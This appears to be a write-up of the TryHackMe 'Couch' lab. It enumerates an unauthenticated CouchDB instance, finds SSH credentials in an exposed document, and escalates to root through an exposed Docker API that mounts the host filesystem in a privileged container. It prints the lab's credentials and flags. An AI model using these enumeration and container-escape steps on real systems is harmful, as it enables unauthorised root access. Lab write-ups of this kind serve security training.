@@ -1,0 +1,127 @@
+Main IP :: 10.48.158.167
+
+
+Currently we are going to solve another tryhackme challenge which is couch.
+We have the Main IP and attack box running into the browser.
+
+Let's start with full port scan.
+
+Nmap scan report for 10.48.158.167
+Host is up, received reset ttl 64 (0.00035s latency).
+Scanned at 2026-05-13 07:37:20 BST for 12s
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
+|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
+|   256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
+5984/tcp open  http    syn-ack ttl 64 CouchDB httpd 1.6.1 (Erlang OTP/18)
+|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+so we got this result so let's start with port 5984
+
+Which is CouchDB Erland Go Server.
+
+But let's first start with burpsuite and run some checks and see what and how this web-app works.
+
+So adding IP to /etc/hosts file and moving to open couch.thm in burp browser and we see just uuid and some information of the Operating System.
+
+So we ran directory fuzzing and scanning and got things like /secret, /_stats, /_config
+
+when visiting _config -> we got {"name":"Ubuntu","version":"16.04"},"replicator":{"connection_timeout":"30000","db":"_replicator","http_connections":"20","max_replication_retry_count":"10","retries_per_request":"10","socket_options":"[{keepalive, true}, {nodelay, false}]","ssl_certificate_max_depth":"3","verify_ssl_certificates":"false","worker_batch_size":"500","worker_processes":"4"},"couch_httpd_oauth":{"use_users_db":"false"},"ssl":
+
+and more moving further
+
+":"number of times a document was read from a database","current":null,"sum":null,"mean":null,"stddev":null,"min":null,"max":null},"open_os_files":{"description":"number of file descriptors CouchDB has open","current":2.0,"sum":2.0,"mean":0.016000000000000000333,"stddev":0.17699999999999999067,"min":0,"max":2},"auth_cache_hits":{"description":"number of authentication cache hits","current":null,"sum":n
+
+so we have ports number and db name which is CouchDB
+
+
+Running fuzzing again with the big.txt we get new directories.
+
+_config                 [Status: 200, Size: 4808, Words: 80, Lines: 2]
+:: Progress: [1202/20469] :: Job [1/1] :: 888 req/sec :: Duration: [0:00:01] :: :: Progress: [1233/20469] :: Job [1/1] :: 892 req/sec :: Duration: [0:00:01] :: :: Progress: [1343/20469] :: Job [1/1] :: 880 req/sec :: Duration: [0:00:01] :: _log                    [Status: 200, Size: 1000, Words: 152, Lines: 13]
+:: Progress: [1347/20469] :: Job [1/1] :: 880 req/sec :: Duration: [0:00:01] :: _plugins                [Status: 405, Size: 60, Words: 3, Lines: 2]
+:: Progress: [1408/20469] :: Job [1/1] :: 897 req/sec :: Duration: [0:00:01] :: :: Progress: [1458/20469] :: Job [1/1] :: 890 req/sec :: Duration: [0:00:01] :: _stats                  [Status: 200, Size: 4776, Words: 156, Lines: 2]
+:: Progress: [1462/20469] :: Job [1/1] :: 890 req/sec :: Duration: [0:00:01] :: _utils                  [Status: 301, Size: 0, Words: 1, Lines: 1]
+:: Progress: [1470/20469] :: Job [1/1] :: 890 req/sec :: Duration: [0:00:01] :: _users                  [Status: 200, Size: 230, Words: 1, Lines: 2]
+
+
+So _utils gives us the important information about all the backend of the browser based backing 
+
+And after looking much into the full webpage and website we can list and see 
+
+http://couch.thm:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7
+and we will get the user and the password. 
+
+atena:t4qfzcc4qN##
+
+from password backup
+
+atena@ubuntu:~$ ls
+user.txt
+atena@ubuntu:~$ cat user.txt 
+THM{1ns3cure_couchdb}
+
+with this we logged-in to ssh and got the user flag.
+
+PRIVILEDGE ESCALATION ->
+
+uname -a
+Linux ubuntu 4.4.0-193-generic #224-Ubuntu SMP Tue Oct 6 17:15:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+atena@ubuntu:~$ ls -lah
+total 48K
+drwxr-xr-x 6 atena atena 4.0K Dec 18  2020 .
+drwxr-xr-x 3 root  root  4.0K Oct 24  2020 ..
+-rw------- 1 atena atena 3.1K Dec 18  2020 .bash_history
+-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
+-rw-r--r-- 1 atena atena 3.7K Oct 24  2020 .bashrc
+drwxr-xr-x 3 root  root  4.0K Oct 24  2020 .bundle
+drwx------ 2 atena atena 4.0K Oct 24  2020 .cache
+drwx------ 2 root  root  4.0K Oct 24  2020 .gnupg
+drwxrwxr-x 2 atena atena 4.0K Dec 18  2020 .nano
+-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
+-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
+-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
+-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
+
+we can read from here, always read hidden files first to get better idea of getting root shell.
+
+sudo -s
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+uname -a
+exit
+
+we can see this command ran lastly maybe a docker container 
+
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+
+ls
+
+
+ls
+/ # 
+/ # 
+/ # ls
+bin    etc    lib    mnt    proc   run    srv    tmp    var
+dev    home   media  opt    root   sbin   sys    usr
+/ # whoami
+root
+
+so we have root shell let's find if we can have /root/root.txt but no file here let's use file command to get more about it.
+
+# find / -type f -name 'root.txt' 2>/dev/null 
+/mnt/root/root.txt
+
+THM{RCE_us1ng_Docker_API}
+
+So we did this room completed.
